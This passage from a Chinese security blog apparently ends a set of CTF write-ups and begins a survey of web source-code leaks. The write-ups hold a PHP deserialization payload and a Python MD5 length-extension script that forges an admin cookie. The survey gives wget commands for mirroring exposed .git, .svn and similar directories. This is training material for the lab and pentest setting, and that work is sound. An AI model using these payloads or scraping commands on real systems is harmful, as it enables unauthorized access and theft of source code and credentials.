<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">//flag is in pctf.php</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) </div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span></div><div class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</div><div class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><code>shield.php</code> 中说flag在 <code>pctf.php</code> 里，但是在 <code>showing.php</code> 中被过滤了，所以直接读它拿到的是假flag。留意到 <code>index.php</code> 里用了反序列化，可以利用这点构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $a = <span class="keyword">new</span> Shield();</div><div class="line">    $a-&gt;file = <span class="string">"pctf.php"</span>;</div><div class="line">    <span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>序列化后的结果为：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</div></pre></td></tr></table></figure>
<p>利用 <code>index.php</code> 中的 <code>class</code> 参数传入payload然后再反序列化就可以拿到flag了。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:<span class="number">32768</span>/?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</div></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--?php </span></div><div class="line">    //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</div><div class="line">    //Fake flag:</div><div class="line">    echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</div><div class="line">?--&gt;</div></pre></td></tr></table></figure>
<hr>
<h3 id="0x04-flag在管理员手里"><a href="#0x04-flag在管理员手里" class="headerlink" title="0x04 flag在管理员手里"></a>0x04 flag在管理员手里</h3><p>只有管理员才能获得flag，你能想办法获得吗？</p>
<p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">http://web.jarvisoj.com:32778/</a></p>
<p>vim备份文件泄露（ <code>/index.php~</code> ），恢复后拿到源码（题目有点问题，<code>vim -r</code> 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;  </div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</div><div class="line">        &lt;style type=<span class="string">"text/css"</span>&gt;</div><div class="line">            body &#123;</div><div class="line">                background:gray;</div><div class="line">                text-align:center;  </div><div class="line">            &#125;</div><div class="line">        &lt;/style&gt;</div><div class="line">    &lt;/head&gt; </div><div class="line">    &lt;body&gt;</div><div class="line">        <span class="meta">&lt;?php</span></div><div class="line">            $auth = <span class="keyword">false</span>;</div><div class="line">            $role = <span class="string">"guest"</span>;   </div><div class="line">            $salt = ;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</div><div class="line">                $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</div><div class="line">                $hsh = $_COOKIE[<span class="string">"hsh"</span>];</div><div class="line">                <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </div><div class="line">                    $auth = <span class="keyword">true</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                    $auth = <span class="keyword">false</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;&#125;   </div><div class="line">                $s = serialize($role);</div><div class="line">                setcookie(<span class="string">'role'</span>,$s);</div><div class="line">                $hsh = md5($salt.strrev($s));</div><div class="line">                setcookie(<span class="string">'hsh'</span>,$hsh);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> ($auth) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </div><div class="line">            &#125;</div><div class="line">        <span class="meta">?&gt;</span>  </div><div class="line">    &lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>核心语句为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">role===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))</span></div></pre></td></tr></table></figure></p>
<p>查了些资料，发现可以使用 <code>哈希长度扩展攻击</code> 。</p>
<p>做题的时候整理了一下这里涉及的知识点 - <a href="http://blog.cyris.cn/2018/02/02/hash-extender-attack/" target="_blank" rel="external">传送门</a></p>
<p>利用工具：</p>
<blockquote>
<p><a href="https://github.com/bwall/HashPump" target="_blank" rel="external">HashPump</a><br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">hash_extender</a></p>
</blockquote>
<p>已有条件：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Cookie-hsh：<span class="number">3</span>a<span class="number">4727</span>d<span class="number">57463</span>f<span class="number">122833</span>d<span class="number">9</span>e<span class="number">732</span>f<span class="number">94</span>e<span class="number">4</span>e<span class="number">0</span></div><div class="line">Cookie-role：s<span class="meta">%</span><span class="number">3</span>A<span class="number">5</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">22</span>guest<span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">3</span>B</div><div class="line">需要求：md<span class="number">5</span><span class="comment">(salt+strrev(admin)</span>)</div><div class="line">* salt长度未知</div></pre></td></tr></table></figure></p>
<p>这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></div><div class="line">        <span class="comment">#print x</span></div><div class="line">        <span class="comment">#print y</span></div><div class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></div><div class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</div><div class="line">        <span class="comment">#print cookie</span></div><div class="line">    build_header = &#123;</div><div class="line">            <span class="string">'Cookie'</span>: cookie,</div><div class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</div><div class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</div><div class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</div><div class="line">    &#125;</div><div class="line">    urlparts = urlparse(url)</div><div class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</div><div class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</div><div class="line">    resp = conn.getresponse()</div><div class="line">    body = resp.read()</div><div class="line">    <span class="keyword">return</span> body</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</div><div class="line">    <span class="keyword">print</span> i</div><div class="line">    <span class="comment"># secret len = ???</span></div><div class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></div><div class="line">    <span class="comment">#print find_hash</span></div><div class="line">    calc_res = os.popen(find_hash).readlines()</div><div class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</div><div class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</div><div class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</div><div class="line">    ret = gao(attack_padding, hash_value)</div><div class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</div><div class="line">        <span class="keyword">print</span> ret</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>得到回显：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">12</div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></div><div class="line">	<span class="selector-tag">body</span> &#123;</div><div class="line">		<span class="attribute">background</span>:gray;</div><div class="line">		<span class="attribute">text-align</span>:center;</div><div class="line">	&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>同时也可以知道 salt 的长度为12。</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Web源码泄漏总结]]></title>
      <url>/2017/10/27/code-leakage/</url>
      <content type="html"><![CDATA[<p>源码泄漏的问题经常在一些渗透测试或者CTF中出现，这篇文章对一些常见的情况做了点整理。  </p>
<a id="more"></a>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>别看了这里没东西Σ(っ °Д °;)っ</p>
<p>大概是强迫症想加个前言∑(O_O；)</p>
<p>不过趁着放假还是说两句吧ᔪ꒰ ꒪ω꒪ |||꒱</p>
<p>昨天带着小饼干跑去远远的地方搭帐篷玩耍了，很久前就买了的帐篷一直没地方用。带的东西不多，就一点零食，两只包。两个人，一片湖，一份太阳，一个下午。在包围苍天的小世界里很懒散地度过一段什么都不用去想的时间还是挺棒的。再过一小段时间一些杂事也就都清完了，花了一年的时间寻找方向，寻找方法，调理时间，接下来就去安安静静地大干一场吧。</p>
<p><a href="https://bangumi.bilibili.com/anime/6439/" target="_blank" rel="external">幻界战线</a>第二季开更啦，有生之年！是自己非常喜欢的一部番，做个小推荐吧⁽⁽٩( ´͈ ᗨ `͈ )۶⁾⁾     ``</p>
<p>好啦下面开始正题。</p>
<hr>
<h2 id="0x01-hg源码泄漏"><a href="#0x01-hg源码泄漏" class="headerlink" title="0x01 .hg源码泄漏"></a>0x01 .hg源码泄漏</h2><p><a href="https://www.mercurial-scm.org/" target="_blank" rel="external">Mercurial</a>，一个版本管理软件。名字是水银的意思，所以用了<code>hg</code>（汞）的缩写。</p>
<p>它的用法和git有点类似，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台，不像git需要MinGW才得以运行，所以也有不少人喜欢用hg进行版本管理。   </p>
<p>其泄漏内容主要包括：</p>
<ul>
<li>项目代码</li>
<li>仓库地址</li>
<li>仓库用户名</li>
</ul>
<p><strong>漏洞成因</strong><br>在使用<code>hg init</code>初始化代码库的时候，会在当前目录下产生一个<code>.hg</code>的隐藏文件。</p>
<p>e.g. <a href="http://www.target.com/.hg" target="_blank" rel="external">http://www.target.com/.hg</a></p>
<p><strong>漏洞利用</strong><br>下载.hg文件：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -r <span class="params">--no-parent</span> <span class="params">--mirror</span> http:<span class="string">//www.target.com/.hg</span></div></pre></td></tr></table></figure></p>
<p>代码重构：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hg <span class="built_in">revert</span></div></pre></td></tr></table></figure></p>
<p><strong>利用工具</strong>      </p>
<ul>
<li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></li>
</ul>
<hr>
<h2 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02 .git源码泄漏"></a>0x02 .git源码泄漏</h2><p>在Github中被泄露的敏感信息主要包括以下几类：</p>
<ul>
<li>邮箱信息</li>
<li>SVN信息</li>
<li>内部账号及密码</li>
<li>数据库连接信息</li>
<li>服务器配置信息</li>
</ul>
<p>这些敏感信息有的只是导致一些无法被外网连接的内网账户信息或者数据库连接信息泄露，但时也可能会导致公司重要的商业秘密或程序源代码被他人窃取，管理员账户被控制或者数据库泄露等，造成巨大的损失。           </p>
<p><strong>漏洞成因</strong><br>在运行<code>git init</code>初始化代码库的时候，会在当前目录下面产生一个名为<code>.git</code>的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
<p>e.g. target.com/.git</p>
<p><strong>漏洞利用</strong><br>下载.git文件<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget <span class="params">--mirror</span> <span class="params">--include-directories=/</span><span class="string">.git</span> http:<span class="string">//www.target.com/.git</span></div></pre></td></tr></table></figure></p>
<p>代码重构<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">reset</span> <span class="comment">--hard</span></div></pre></td></tr></table></figure></p>
<p><strong>利用工具</strong>      </p>
<ul>
<li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a>（除了git还支持很多其他的版本管理系统）   </li>
<li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a></li>
</ul>
<hr>
<h2 id="0x03-bzr文件泄漏"><a href="#0x03-bzr文件泄漏" class="headerlink" title="0x03 .bzr文件泄漏"></a>0x03 .bzr文件泄漏</h2><p><a href="http://bazaar.canonical.com/en/" target="_blank" rel="external">Bazaar</a>也是一个版本管理工具，不多说了。</p>
<p><strong>漏洞成因</strong><br>在通过<code>bzr init</code>初始化项目时会在其根目录下产生名为<code>.bzr</code>的隐藏目录，同样能够暴露大量的源代码与用户信息。</p>
<p><strong>漏洞利用</strong><br>下载.bzr文件：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -r <span class="params">--no-parent</span> <span class="params">--mirror</span> http:<span class="string">//www.target.com/.bzr</span></div></pre></td></tr></table></figure></p>
<p>回滚版本：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bzr </span><span class="keyword">revert</span></div></pre></td></tr></table></figure></p>
<p><strong>利用工具</strong><br>用上面提到的工具就可以。</p>
<hr>
<h2 id="0x04-DS-Store文件泄漏"><a href="#0x04-DS-Store文件泄漏" class="headerlink" title="0x04 .DS_Store文件泄漏"></a>0x04 .DS_Store文件泄漏</h2><p><code>.DS_Store</code>(Desktop Services Store)是macOS目录下的隐藏文件，包含了当前目录结构和一些的自定义信息，如背景和图标位置等，在windows下类似的文件为<code>desktop.ini</code>。暴露了<code>.DS_Store</code>文件也就相当于暴露了该目录下的所有内容，可以说是比较严重的泄露。    </p>
<p>使用MacOS开发时，可以把<code>.DS_Store</code>加入忽略列表中（如<code>.gitignore</code>）, 但本质上其只是泄露目录结构, 就算删掉<code>.DS_Store</code>，文件也依然存在于Web服务器可以访问得到的地方，所以最根本的方法还是不要将敏感信息放在Web路径中。</p>
<p><strong>漏洞成因</strong><br>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。    </p>
<p><strong>漏洞利用</strong><br><code>.DS_Store</code>的格式为二进制，内部数据结构为<a href="https://en.wikipedia.org/wiki/Proprietary_format" target="_blank" rel="external">Proprietary</a>格式，可以自行解析并递归下载所有文件。</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//www.target.com/.ds_store</span></div></pre></td></tr></table></figure>
<p><strong>利用工具</strong></p>
<ul>
<li><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">ds_store_exp</a></li>
</ul>
<hr>
<h2 id="0x05-svn文件泄漏"><a href="#0x05-svn文件泄漏" class="headerlink" title="0x05 .svn文件泄漏"></a>0x05 .svn文件泄漏</h2><p><a href="https://subversion.apache.org/" target="_blank" rel="external">SVN</a>也是一个版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。在git之前这也是一款比较热门的版本管理工具，但现在只有一些国企，研究院，或者比较早的项目仍在使用它进行代码管理。</p>
<p>在SVN中泄漏的内容主要包括：</p>
<ul>
<li>项目的源代码</li>
<li>svn仓库地址</li>
<li>svn仓库所属用户的用户名            </li>
</ul>
<p><strong>漏洞成因</strong><br>与git类似，svn在项目项目初始化时会在根目录下会创建一个<code>.svn</code>的隐藏文件夹，包含了所有分支commit信息和代码记录。</p>
<p><strong>漏洞利用</strong><br>还是与git相似，先下载目录:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -r <span class="params">--no-parent</span> <span class="params">--mirror</span> http:<span class="string">//www.target.com/.svn</span></div></pre></td></tr></table></figure></p>
<p>然后进行版本回滚:</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">svn revert <span class="comment">--recursive .</span></div></pre></td></tr></table></figure>
<p><strong>利用工具</strong>      </p>
<ul>
<li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a>（同时支持旧版与新版的svn）</li>
<li><a href="http://www.cnseay.com/3417/" target="_blank" rel="external">Seay-Svn</a>（一个基于windows平台的工具）</li>
</ul>
<hr>
<h2 id="0x06-CVS文件泄漏"><a href="#0x06-CVS文件泄漏" class="headerlink" title="0x06 .CVS文件泄漏"></a>0x06 .CVS文件泄漏</h2><p><a href="http://www.thathost.com/wincvs-howto/cvsdoc/cvs_toc.html" target="_blank" rel="external">CVS</a>是一个年代比较久远的版本控制系统，通过它可以追踪源代码的历史变化记录。但是因为功能比较简单，而且不支持分支，所以很早前就被上面提到的svn替代了。      </p>
<p>因为是纯客户端的工具, 所以只会泄露源代码。</p>
<p><strong>漏洞成因</strong><br>cvs项目在初始化(cvs checkout project)的时候，会在project目录下创建一个名为CVS的目录，其中保存了各个文件的修改和commit记录，通过此目录可以获取代码的历史版本。其中两个关键文件为：CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。</p>
<p><strong>漏洞利用</strong><br>下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget -r <span class="params">--no-parent</span> <span class="params">--mirror</span> http:<span class="string">//www.target.com/CVS</span></div><div class="line">cvs diff *</div></pre></td></tr></table></figure>
<p><strong>利用工具</strong>      </p>
<ul>
<li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a>（啊没错又是这个）</li>
</ul>
<hr>
<h2 id="0x07-备份文件"><a href="#0x07-备份文件" class="headerlink" title="0x07 备份文件"></a>0x07 备份文件</h2><p>备份文件泄露又分为两种情况：</p>
<ol>
<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。   </li>
<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
</ol>
<p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
<h3 id="1-Vim源码泄露"><a href="#1-Vim源码泄露" class="headerlink" title="1. Vim源码泄露"></a>1. Vim源码泄露</h3><p>如果发现页面有提示vi或者vim之类的，说明存在swp文件泄露，比如当前页面是<code>/index.php</code>，直接访问<code>/.index.php.swp</code>或者<code>/index.php~</code>，可以直接获得源码。</p>
<p>有的时候可能下载下来的文件是有一定的乱码。在linux下面执行<code>vim -r index.php</code>，可以恢复文件。</p>
<h3 id="2-常见漏洞检测"><a href="#2-常见漏洞检测" class="headerlink" title="2. 常见漏洞检测"></a>2. 常见漏洞检测</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.rar</span></div><div class="line"><span class="selector-class">.zip</span></div><div class="line">.<span class="number">7</span>z</div><div class="line"><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-class">.bak</span></div><div class="line"><span class="selector-class">.swp</span></div><div class="line"><span class="selector-class">.txt</span></div><div class="line">.html</div></pre></td></tr></table></figure>
<hr>
<h2 id="0x08-WEB-INF-web-xml泄漏"><a href="#0x08-WEB-INF-web-xml泄漏" class="headerlink" title="0x08 WEB-INF/web.xml泄漏"></a>0x08 WEB-INF/web.xml泄漏</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<blockquote>
<p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件。<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件。</p>
</blockquote>
<p><strong>漏洞成因</strong><br>通常一些Web应用我们会使用多个Web服务器搭配使用，解决其中的一个Web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p><strong>漏洞利用</strong><br>通过web.xml文件推测应用组件相关类的名字，然后在src目录下查找代码，如果没有源代码可以直接下载class文件反编译即可。</p>
<hr>
<h2 id="0x09-配置文件泄露"><a href="#0x09-配置文件泄露" class="headerlink" title="0x09 配置文件泄露"></a>0x09 配置文件泄露</h2><p>现代Web开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。</p>
<p><strong>漏洞利用</strong><br>通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好<br>常见的配置文件路径，如wordpress的/wp-config.php等，组织成字典然后用脚本进行批量测试。</p>
<p><strong>利用工具</strong>    </p>
<ul>
<li><a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst" target="_blank" rel="external">参考字典</a></li>
</ul>
<hr>
<h2 id="0x10-目录穿越"><a href="#0x10-目录穿越" class="headerlink" title="0x10 目录穿越"></a>0x10 目录穿越</h2><p>目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的<code>../</code>之类的目录跳转符，导致用户可以访问Web根目录的上级从而遍历服务器上的任意文件。</p>
